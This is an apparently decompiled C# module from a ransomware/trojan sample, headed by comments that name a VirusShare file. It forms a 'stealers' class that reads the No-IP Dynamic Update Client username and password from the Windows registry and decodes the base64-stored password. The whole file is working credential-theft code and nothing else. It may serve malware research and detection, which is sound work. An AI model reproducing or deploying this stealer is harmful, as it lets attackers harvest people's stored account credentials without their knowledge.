// Decompiled with JetBrains decompiler
// Type: rundll32.stealers.noip
// Assembly: rundll32, Version=6.1.7600.16385, Culture=neutral, PublicKeyToken=null
// MVID: F8DEF9AB-CB2D-4DED-9871-4A53218D5E3A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00070-msil\Trojan-Ransom.Win32.Blocker.jlzp-3198bccbd4230852e51b4a91bbbb499340cca67260e90e0a7fbcec0fe32fa3e8.exe

using Microsoft.Win32;
using System;
using System.Text;

namespace rundll32.stealers
{
  internal class noip
  {
    private static string base64Decode(string data)
    {
      try
      {
        Decoder decoder = new UTF8Encoding().GetDecoder();
        byte[] bytes = Convert.FromBase64String(data);
        char[] chars = new char[decoder.GetCharCount(bytes, 0, bytes.Length)];
        decoder.GetChars(bytes, 0, bytes.Length, chars, 0);
        return new string(chars);
      }
      catch (Exception ex)
      {
        throw new Exception("Error in base64Decode" + ex.Message);
      }
    }

    public static noip.acount steal()
    {
      string str = (string) Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Vitalwerks\\DUC", "Username", (object) null);
      string data = (string) Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Vitalwerks\\DUC", "Password", (object) null);
      return new noip.acount()
      {
        user = str,
        pass = noip.base64Decode(data)
      };
    }

    public struct acount
    {
      public string user;
      public string pass;
    }
  }
}
